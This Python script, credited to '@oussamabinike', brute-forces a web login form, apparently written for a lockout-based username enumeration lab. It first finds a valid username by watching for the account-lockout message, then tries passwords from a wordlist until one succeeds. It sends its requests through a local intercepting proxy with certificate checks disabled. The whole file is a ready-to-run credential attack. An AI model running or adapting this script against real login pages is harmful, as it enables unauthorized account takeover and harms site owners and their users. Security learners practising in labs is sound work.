import requests,argparse,urllib3,sys
from random import randrange
from termcolor import colored,COLORS
from colorama import init
from pyfiglet import figlet_format,FigletFont
from bs4 import BeautifulSoup

init(autoreset=True)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.01:8080', 'https': 'http://127.0.0.1:8080'}

def parsearg():
    parser = argparse.ArgumentParser(formatter_class=argparse.ArgumentDefaultsHelpFormatter)
    parser.add_argument('-u','--url',
                        dest='url',
                        help='url for the target ex : https://www.example.com',
                        required=True)
    parser.add_argument('-L','--L',
                        dest='L',
                        help='List of users',
                        default='usernames.txt',
                        required=False)
    
    parser.add_argument('-P','--P',
                        dest='P',
                        help='List of passwords',
                        default='passwords.txt',
                        required=False)
   
    return parser.parse_args()

def banner():
    # generating randfonts
    List=FigletFont.getFonts()
    random_numbner=randrange(len(List)-1)
    random_font=List[random_numbner]

    # generating randcolors
    color=[]
    for i in COLORS:
        if i !='black' and i!='light_blue' and i!='grey':
            color.append(i)
    random_numbner=randrange(len(color)-1)
    random_colore=color[random_numbner]

    #  printing the banner 
    font=figlet_format('enumeration',font=random_font)
    print(colored(font,random_colore))
    print(colored("Build a Simple brute forcing Script with Python", 'yellow'))
    print(colored("Author: @oussamabinike\n", 'yellow'))


def post(s,url,data):
    # generating post request
    path = "/login"
    try:
        r=s.post(url=url+path, data=data, verify=False, proxies=proxies)
        return r
    except Exception as e:
        print(colored(e,'red'))
        sys.exit()

def exploit(s, url,list_of_users,list_of_passwords):
    try:
        # Read the list of users
        with open(list_of_users,'r')as f:
            for user in f.readlines():
                user=user.replace('\n','')
                data = {'username':user,'password':'test'}

                # print the user we are testing
                sys.stdout.write(f'\rtesting whit user {user}')
                sys.stdout.flush()
                r = post(s=s,url=url,data=data)

                if 'You have made too many incorrect login attempts. Please try again in 1 minute(s).' in r.text:
                    colored_user=colored(user,'green')
                    print("\n(+)we found the valid user: %s" %colored_user)
                    f.close()
                    break

        #Read the list of passwords
        with open(list_of_passwords,'r')as f:
            for password in f.readlines():
                password=password.replace('\n','')
                data = {'username':user,'password':password}

                # Match user and password
                sys.stdout.write(f'\rtesting whit user: {colored_user} and passsword : {password}')
                sys.stdout.flush()
                r = post(s=s,url=url,data=data)

                if 'You have made too many incorrect login attempts. Please try again in 1 minute(s).' not in r.text and 'Invalid username or password.'not in r.text :
                    colored_pass=colored(password,'green')
                    print("\n(+) the valid password is: %s"%colored_pass)
                    print(f"the user name is {colored_user} and password {colored_pass}")
                    f.close()
                    break
    except Exception as e:
        e=colored(e,'red')
        print('\n'+e)

    
def main():
    banner()
    url=parsearg().url
    list_of_users=parsearg().L
    list_of_passwords=parsearg().P

    url=str(url).rstrip('/')
    url=str(url).replace('/login','',1)

    s = requests.Session()
    exploit(s, url,list_of_users,list_of_passwords)

if __name__ == "__main__":
    main()